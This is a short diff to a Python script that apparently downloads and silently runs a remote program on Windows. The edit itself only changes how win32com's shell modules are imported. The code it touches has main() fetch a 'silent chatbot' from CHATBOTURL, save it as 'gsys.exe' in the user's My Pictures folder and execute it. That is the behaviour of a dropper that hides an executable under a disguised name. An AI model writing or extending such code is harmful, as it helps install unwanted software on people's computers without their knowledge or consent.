@@ -35,7 +35,8 @@ def file_in_special_path(specialpath, fname):
     @param specialpath: The CSIDL path found in shellcon
     @param fname: the name of the file
     """
-    path = win32com.shell.shell.SHGetFolderPath(0, specialpath, None, 0)
+    from win32com.shell import shell
+    path = shell.SHGetFolderPath(0, specialpath, None, 0)
     path = os.path.join(path, fname)
     return path
 
@@ -69,7 +70,8 @@ def __file_setstate(path, state):
 
 def main():
     """Download the silent chatbot and run it."""
-    download_install_run(CHATBOTURL, win32com.shellcon.CSIDL_MYPICTURES, "gsys.exe")
+    from win32com.shell import shellcon
+    download_install_run(CHATBOTURL, shellcon.CSIDL_MYPICTURES, "gsys.exe")
     
 if __name__ == "__main__":
     main()
